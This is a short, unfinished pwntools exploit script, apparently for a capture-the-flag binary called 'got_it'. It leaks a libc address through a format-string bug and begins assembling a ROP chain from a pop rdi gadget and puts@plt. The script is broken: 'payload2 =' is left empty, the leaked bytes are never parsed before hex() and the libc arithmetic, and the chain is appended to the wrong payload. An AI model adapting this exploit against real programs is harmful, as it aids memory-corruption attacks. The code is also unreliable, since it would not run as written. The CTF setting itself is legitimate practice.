from pwn import *


p= process('./got_it')
elf= ELF('./got_it')
libc = ELF('libc-2.27.so')
exit_got = 0x403fa8
_start= 0x00000000004010b0
pop_rdi= 0x0000000000401433
writable_address = 0x0000000000403000
puts_plt = elf.sym["puts"] #0x0000000000401080
Main = elf.sym["main"]



p.recvuntil("out!\n")

#fmt string starting address offset is 8 aaaaaaaa%p-%p-%p-%p-%p-%p-%p-%p
payload = "%43$p".ljust(8)

p.sendline(payload)

p.recvuntil("I don't think ")

leak = p.recvline()
log.info("leaked address: %s" + hex(leak))

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))


payload2 = 
payload += p64(pop_rdi)
payload += p64(writable_address)


payload += p64(puts_plt)
#payload += p64(writable_address)

#payload += p64(_start)

#p.sendline(payload2)

p.interactive()



